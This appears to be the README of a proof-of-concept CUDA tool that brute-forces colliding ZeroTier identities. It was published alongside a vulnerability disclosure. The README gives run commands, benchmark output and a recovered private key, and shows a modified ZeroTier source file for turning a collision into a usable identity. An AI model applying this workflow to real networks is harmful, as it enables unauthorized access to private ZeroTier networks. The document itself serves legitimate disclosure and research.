# ZTCrack - A Zerotier CUDA Bruteforce proof-of-concept

This repo shows a proof-of-concept tool that can be used to generate colliding Zerotier identities with CUDA. This code is awful, you shouldn't use it and probably don't want to. This code isn't optimized, includes various snippets and chunks copied-and-pasted from Zerotier and other sources, contains overflow issues and doesnt follow any sort of CUDA (or any other, for that matter) best-practice.

Private keys are generated by incrementing a 64 bit integer. If you do find a collision, you should not use the private key for anything aside from testing Zerotier.

This codebase has been released as part of a wider [Zerotier vulnerability disclosure](https://pulsesecurity.co.nz/advisories/Zerotier-Private-Network-Access)

## Running

Target network identifiers are expected in `targets.dat` in binary. If this file doesnt exist, the tool is run in benchmark mode instead where 5 valid hashes will be generated and then exit.

I ran this on an RTX2070 with the following:

```
> nvprof.exe .\ztcrack.exe 32 72 6600
Setting heap size to 6920601600
==9804== NVPROF is profiling process 9804, command: .\ztcrack.exe 32 72 6600
[!] Error: Could not open file targets.dat: No such file or directory
[!] Running in benchmark mode
Running 72 threads and 32 blocks. Total 2304
==9804== Profiling application: .\ztcrack.exe 32 72 6600
==9804== Profiling result:
            Type  Time(%)      Time     Calls       Avg       Min       Max  Name
 GPU activities:  100.00%  169.977s         1  169.977s  169.977s  169.977s  crack(void*, __int64, bool)
      API calls:   99.74%  169.977s         1  169.977s  169.977s  169.977s  cudaDeviceSynchronize
                    0.13%  224.94ms         1  224.94ms  224.94ms  224.94ms  cudaDeviceSetLimit
                    0.13%  215.61ms         1  215.61ms  215.61ms  215.61ms  cudaLaunchKernel
                    0.00%  26.400us         1  26.400us  26.400us  26.400us  cuDeviceTotalMem
                    0.00%  21.000us        97     216ns     100ns  1.1000us  cuDeviceGetAttribute
                    0.00%  9.2000us         1  9.2000us  9.2000us  9.2000us  cuDeviceGetPCIBusId
                    0.00%  2.2000us         1  2.2000us  2.2000us  2.2000us  cudaGetLastError
                    0.00%  2.1000us         1  2.1000us  2.1000us  2.1000us  cuDeviceGetName
                    0.00%  1.9000us         2     950ns     300ns  1.6000us  cuDeviceGet
                    0.00%  1.5000us         3     500ns     400ns     600ns  cuDeviceGetCount
                    0.00%     400ns         1     400ns     400ns     400ns  cuDeviceGetLuid
                    0.00%     300ns         1     300ns     300ns     300ns  cuDeviceGetUuid
```

The first parameter is the number of blocks, the second is the number of threads. The third parameter is the device heap size in MB. The heap size needs to be large enough to support the `genmem` area per-thread, which is 2097152 bytes. In benchmark mode, each thread will generate 5 valid private keys and then exit. So in this case it took 170 seconds to generate 11520 valid keys, or roughly 68 hashes-per-second.

You can generate a `targets.dat` by converting the 5 byte network address into binary and sending that into a file:

```
echo 62613ea298 | xxd -p -r > targets.dat
echo 4142434445 | xxd -p -r >> targets.dat
```

When a collision is found, it'll echo out the private key and the network address it matched:

```
PS C:\Users\DoI\Documents\src\cuda_salsa20> .\ztcrack.exe 32 72 6600
Setting heap size to 6920601600
bufsize: 16200040
read: 16200040
Initial
Running 72 threads and 32 blocks. Total 2304
key: 18438737674372003211, address: 62613ea298
```

You can then tweak the zerotier C22519 generation to match the bruteforcer and spit out an identity file.

```
doi@COG-2:~/src/ZeroTierOne$ ./zerotier-idtool generate test.secret
first byte: 6 06
address: 62613ea298
test.secret written
doi@COG-2:~/src/ZeroTierOne$ cat test.secret
62613ea298:0:d4e243391009b7f4f77a068697875d48bd34dbaa29c3e8c37ba306a4f64bc14f3b6a27bcceb6a42d62a3a8d02a6f0d73653215771de243a63ac048a18b59da29:00008b358ee3388ee3ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

The following shows my modified C22516.hpp file:

```
 72     template<typename F>
 73     static inline Pair generateSatisfying(F cond)
 74     {
 75         Pair kp;
 76         uint8_t * priv = (uint8_t *)kp.priv.data;
 77         //Utils::getSecureRandom(priv,ZT_C25519_PRIVATE_KEY_LEN);
 78         memset(priv, 0x00, ZT_C25519_PRIVATE_KEY_LEN);
 79
 80         
 81         uint64_t key = 18438737674372003211;
 82         memcpy(priv+2, &key, sizeof(uint64_t));
 83
 84         _calcPubED(kp); // do Ed25519 key -- bytes 32-63 of pub and priv
 85         _calcPubDH(kp); // keep regenerating bytes 0-31 until satisfied
 86         cond(kp);
 87         //while(!cond(kp)){
 88         //  ++(((uint64_t *)priv)[1]);
 89         //  --(((uint64_t *)priv)[2]);
 90         //}
 91         return kp;
 92     }
 ```

Again, hacky. If you're wondering why the integer used as the private key is getting nudged forward, it's to deal with C25519's clamping of higher bits.
